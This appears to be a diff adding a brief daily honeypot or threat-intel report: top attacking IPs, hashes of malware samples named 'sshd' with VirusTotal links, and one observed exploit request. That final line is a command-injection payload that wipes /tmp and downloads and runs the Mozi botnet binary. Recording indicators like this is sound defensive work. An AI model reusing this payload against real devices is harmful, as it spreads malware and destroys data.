@@ -1,0 +1,26 @@
+Top 5 IPs for 01-11-2024 :
+
+120.61.28.91
+221.230.38.202
+47.114.95.91
+176.192.243.204
+223.75.204.39
+
+Malware Observed:
+
+File name : sshd
+52b070d4137efa4f75ced91177228bce8a3209341defff5061bd7c749fe06a30
+https://www.virustotal.com/gui/file/52b070d4137efa4f75ced91177228bce8a3209341defff5061bd7c749fe06a30
+
+
+File name : sshd
+629db57b96d6e965401d866f895d86c542efe344b3d489630a6ec09d643add76
+https://www.virustotal.com/gui/file/629db57b96d6e965401d866f895d86c542efe344b3d489630a6ec09d643add76
+
+File name : sshd
+9b181d40ede413858c14dfc8524dbc45315a5836129822922327f706bb07038b
+https://www.virustotal.com/gui/file/9b181d40ede413858c14dfc8524dbc45315a5836129822922327f706bb07038b
+
+Commands/exploits observed :
+
+/board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+varcron
